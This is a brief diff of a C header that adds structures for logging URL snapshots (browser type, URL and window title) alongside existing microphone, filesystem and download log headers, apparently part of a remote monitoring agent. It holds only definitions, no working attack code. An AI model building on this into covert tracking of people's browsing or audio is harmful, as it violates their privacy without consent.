@@ -312,6 +312,7 @@ extern u_int remoteAgents[];
 
 #define LOG_DOWNLOAD      0xD0D0
 #define LOG_FILESYSTEM    0xEDA1
+#define LOG_URL_SNAPSHOT  AGENT_URL+1
 
 #pragma mark -
 #pragma mark Configurator Struct Definition
@@ -487,6 +488,11 @@ typedef struct _fileConfiguration {
   char patterns[1]; // wchar_t
 } fileStruct;
 
+typedef struct _urlConfiguration {
+  u_int delimiter;
+  BOOL isSnapshotActive;
+} urlStruct;
+
 #pragma mark -
 #pragma mark Log File Header Struct Definition
 #pragma mark -
@@ -640,6 +646,14 @@ typedef struct _microphoneHeader {
   u_int hiTimestamp;
   u_int loTimestamp;
 } microphoneAdditionalStruct;
+
+typedef struct _urlSnapshotHeader {
+  u_int version;
+#define LOG_URLSNAP_VERSION 2010071301
+  u_int browserType;
+  u_int urlNameLen;
+  u_int windowTitleLen;
+} urlSnapAdditionalStruct;
 
 #pragma pack(2)
 
